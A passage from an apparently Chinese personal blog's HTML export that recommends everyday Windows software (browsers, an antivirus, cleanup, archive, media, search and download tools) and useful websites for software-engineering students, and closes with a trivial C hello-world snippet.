title="浏览器"></a>浏览器</h3><blockquote><p>浏览器是我们使用频率最高的软件，有很多扩展功能值得去探索，也能大大提高效率，并且变得好看。</p></blockquote><ul><li><p>Microsoft Edge浏览器<br><br/>windows 10自带的浏览器，干净好用，推荐使用，不过请注意一定不要更换主页为360什么的，使用默认主页。</p></li><li><p>Google chrome浏览器 <a href="https://www.google.cn/intl/en_uk/chrome/">官网链接</a><br/><br>扩展性强，市场排名第一浏览器，调试功能强大</p></li><li><p>Firefox浏览器 <a href="https://www.firefox.com.cn/">官网链接</a><br/><br>开源自由，扩展多，特别好</p></li><li><p>Safari浏览器 <a href="https://www.apple.com.cn/safari/">官网链接</a><br/><br>苹果系统自带，当然Windows用户也可以使用。</p></li></ul><h3 id="杀毒软件"><a href="#杀毒软件" class="headerlink" title="杀毒软件"></a>杀毒软件</h3><ul><li>无</li><li>如果确实很想安装一个，那就要 火绒安全 <a href="https://www.huorong.cn/">官网链接</a> 吧。</li></ul><h3 id="清理软件"><a href="#清理软件" class="headerlink" title="清理软件"></a>清理软件</h3><ul><li>Ccleaner <a href="https://www.ccleaner.com/">官网链接</a><br/><br>如果卸载掉360安全卫士后你觉得没有清理软件了，那么这一款就是评价很高的清理软件，不过我没怎么用过，好像褒贬不一。</li></ul><h3 id="卸载软件"><a href="#卸载软件" class="headerlink" title="卸载软件"></a>卸载软件</h3><ul><li>Geek Uninstaller <a href="https://geekuninstaller.com/">官网链接</a><br/><br>前面介绍过了，直接安装就好。</li></ul><h3 id="压缩软件"><a href="#压缩软件" class="headerlink" title="压缩软件"></a>压缩软件</h3><ul><li><p>360zip <a href="https://yasuo.360.cn/">官网链接</a><br/><br>电脑里必备一款压缩软件，以后需要用到，虽然很多其他的360软件有点难用，但360zip确实很好，无广告，轻量好用。</p></li><li><p>7-zip 或者 bandzip<br/><br>也有推荐这两款的，不过我的360zip的确很好用，所以没下过这两个，但是口碑也还不错。</p></li></ul><h3 id="播放器"><a href="#播放器" class="headerlink" title="播放器"></a>播放器</h3><ul><li>PotPlayer <a href="http://www.potplayercn.com/PotPlayer.html">官网链接</a><br/><br>如果要播放本地视频，请不要选择爱奇艺播放器，这款软件值得，功能强大，界面简洁清爽，无广告，配置选项丰富~</li></ul><h3 id="检索软件"><a href="#检索软件" class="headerlink" title="检索软件"></a>检索软件</h3><ul><li>everything <a href="https://www.voidtools.com/zh-cn/downloads/">官网链接</a><br/><br>一个字：超级强大！该款软件检索文件速度比Windows自带的检索速度快了不知多少倍，并且支持正则表达式等高级搜索功能，强烈推荐。 <br/><blockquote><p>Tips:下载x64位版本的哦，不要下错啦，可以选 &lt;安装版64位&gt;</p></blockquote></li></ul><h3 id="下载软件"><a href="#下载软件" class="headerlink" title="下载软件"></a>下载软件</h3><ul><li>IDM <a href="https://www.internetdownloadmanager.com/">官网链接</a><br/><br>大多数小软件可以直接在官网下载，这款软件的功能主要是提升下载速度，尤其是软件很大的时候优势很明显，只不过操作起来稍稍复杂点。</li></ul><h2 id="网站推荐"><a href="#网站推荐" class="headerlink" title=" 网站推荐"></a><img src="https://i.loli.net/2021/08/03/TZJIHAehx7zVDFR.png" alt="获取元素文本.png"> 网站推荐</h2><h3 id="软件工程常用的"><a href="#软件工程常用的" class="headerlink" title="软件工程常用的"></a>软件工程常用的</h3><ul><li>GitHub <a href="https://github.com/">官网链接</a><br/><br>全球最大开源交流社区，软件工程师必备，学弟学妹们可以早点注册一个，学习一下。网站速度有时候可能比较慢很正常的，有时候需要科学上网设备，同样有一个和GitHub类似的国内交流平台 码云<a href="https://gitee.com/">官网链接</a>。</li></ul><blockquote><p>github使用小技巧：在域名的github后面加上 1s 可以开启在线vscode浏览模式。<br><img src="https://i.loli.net/2021/08/06/93i1QpWYaLZqOtJ.png" alt="image.png"></p></blockquote><ul><li>sm.ms网站 <a href="https://sm.ms/">官网链接</a><br/><br>在写markdown或者前端页面需要插入图片时，如果引用互联网图片则需要该图片的url地址，该网站支持本地图片免费一键上传，并获取该图片的url或markdown地址，是写网页特别好的网站哦。</li></ul><h3 id="实用类"><a href="#实用类" class="headerlink" title="实用类"></a>实用类</h3><ul><li><p>阿里巴巴矢量图标库 <a href="https://www.iconfont.cn/">官网链接</a><br/><br>无论是做PPT还是以后可能接触到的前端页面，有需要使用各种图标或插画的时候，该网站是一个很不错的选择，有各种优质图标插画供免费下载。</p></li><li><p>HOTBOX　<a href="https://www.hotbox.fun/">官网链接</a><br/><br>支持各个网络平台的视频一键下载到本地。</p></li></ul><hr><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Thank you for watching...&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> General Records </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
